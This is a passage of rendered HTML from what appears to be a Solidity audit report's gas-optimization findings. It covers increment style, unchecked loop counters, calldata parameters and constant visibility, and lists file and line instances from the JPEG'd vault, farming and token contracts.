dark-default-dark\" data-language=\"solidity\" data-index=\"80\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">281</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pid</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">pid</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">pid</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StrategyPUSDConvex</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">231</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span></code></pre>\n<h2 id=\"g-37-i-costs-less-gas-compared-to-i-or-i--1\" style=\"position:relative;\"><a href=\"#g-37-i-costs-less-gas-compared-to-i-or-i--1\" aria-label=\"g 37 i costs less gas compared to i or i  1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-37] <code>++i</code> costs less gas compared to <code>i++</code> or <code>i += 1</code></h2>\n<p><code>++i</code> costs less gas compared to <code>i++</code> or <code>i += 1</code> for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.</p>\n<p><code>i++</code> increments <code>i</code> and returns the initial value of <code>i</code>. Which means:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"81\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">i</span><span class=\"mtk1\">++; </span><span class=\"mtk3\">// == 1 but i == 2  </span></span></span></code></pre>\n<p>But <code>++i</code> returns the actual incremented value:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"82\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// == 2 and i == 2 too, so no need for a temporary variable  </span></span></span></code></pre>\n<p>In the first case, the compiler has to create a temporary variable (when used) for returning <code>1</code> instead of <code>2</code></p>\n<p>Instances include:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"83\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">348</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">poolInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StrategyPUSDConvex</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">145</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">_strategyConfig</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rewardTokens</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StrategyPUSDConvex</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">231</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StrategyPUSDConvex</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">319</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">rewardTokens</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">181</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">_typeInitializers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">184</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">initializer</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nfts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\">++) {</span></span></span></code></pre>\n<p>I suggest using <code>++i</code> instead of <code>i++</code> to increment the value of an uint variable.</p>\n<p>This is already done here:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"84\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">281</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pid</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">pid</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">pid</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<h2 id=\"g-38-increments-can-be-unchecked\" style=\"position:relative;\"><a href=\"#g-38-increments-can-be-unchecked\" aria-label=\"g 38 increments can be unchecked permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-38] Increments can be unchecked</h2>\n<p>In Solidity 0.8+, there’s a default overflow check on unsigned integers. It’s possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline.</p>\n<p><a href=\"https://github.com/ethereum/solidity/issues/10695\">ethereum/solidity#10695</a></p>\n<p>Instances include:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"85\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">281</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pid</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">pid</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">pid</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">farming</span><span class=\"mtk1\">/</span><span class=\"mtk12\">LPFarming</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">348</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">poolInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StrategyPUSDConvex</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">145</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">_strategyConfig</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rewardTokens</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StrategyPUSDConvex</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">231</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StrategyPUSDConvex</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">319</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">rewardTokens</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">181</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">_typeInitializers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">184</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">initializer</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nfts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\">++) {</span></span></span></code></pre>\n<p>The code would go from:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"86\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numIterations</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk3\">// ...  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}  </span></span></span></code></pre>\n<p>to:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"87\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numIterations</span><span class=\"mtk1\">;) {  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk3\">// ...  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> { ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">; }  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}  </span></span></span></code></pre>\n<p>The risk of overflow is inexistant for a <code>uint256</code> here.</p>\n<h2 id=\"g-39-use-calldata-instead-of-memory\" style=\"position:relative;\"><a href=\"#g-39-use-calldata-instead-of-memory\" aria-label=\"g 39 use calldata instead of memory permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-39] Use <code>calldata</code> instead of <code>memory</code></h2>\n<p>When arguments are read-only on external functions, the data location should be <code>calldata</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"88\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">212</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setDebtInterestApr</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Rate</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_debtInterestApr</span><span class=\"mtk1\">) </span><span class=\"mtk3\">//@audit gas: should be calldata</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  222:     </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setValueIncreaseLockRate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Rate</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_valueIncreaseLockRate</span><span class=\"mtk1\">)  </span><span class=\"mtk3\">//@audit gas: should be calldata</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  232:     </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setCreditLimitRate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Rate</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_creditLimitRate</span><span class=\"mtk1\">)  </span><span class=\"mtk3\">//@audit gas: should be calldata</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  247:     </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setLiquidationLimitRate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Rate</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_liquidationLimitRate</span><span class=\"mtk1\">)  </span><span class=\"mtk3\">//@audit gas: should be calldata</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  290:     </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setOrganizationFeeRate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Rate</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_organizationFeeRate</span><span class=\"mtk1\">)  </span><span class=\"mtk3\">//@audit gas: should be calldata</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  300:     </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setInsurancePurchaseRate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Rate</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_insurancePurchaseRate</span><span class=\"mtk1\">)  </span><span class=\"mtk3\">//@audit gas: should be calldata</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  311:         </span><span class=\"mtk11\">Rate</span><span class=\"mtk1\"> </span><span class=\"mtk11\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_insuranceLiquidationPenaltyRate</span><span class=\"mtk1\">  </span><span class=\"mtk3\">//@audit gas: should be calldata</span></span></span></code></pre>\n<h2 id=\"g-40-consider-making-some-constants-as-non-public-to-save-gas\" style=\"position:relative;\"><a href=\"#g-40-consider-making-some-constants-as-non-public-to-save-gas\" aria-label=\"g 40 consider making some constants as non public to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-40] Consider making some constants as non-public to save gas</h2>\n<p>Reducing from <code>public</code> to <code>private</code> or <code>internal</code> can save gas when a constant isn’t used outside of its contract.\nI suggest changing the visibility from <code>public</code> to <code>internal</code> or <code>private</code> here:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"89\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">tokens</span><span class=\"mtk1\">/</span><span class=\"mtk12\">JPEG</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">10</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MINTER_ROLE</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MINTER_ROLE&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">tokens</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StableCoin</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">22</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MINTER_ROLE</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;MINTER_ROLE&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">tokens</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StableCoin</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">23</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PAUSER_ROLE</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;PAUSER_ROLE&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">strategies</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StrategyPUSDConvex</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">66</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span 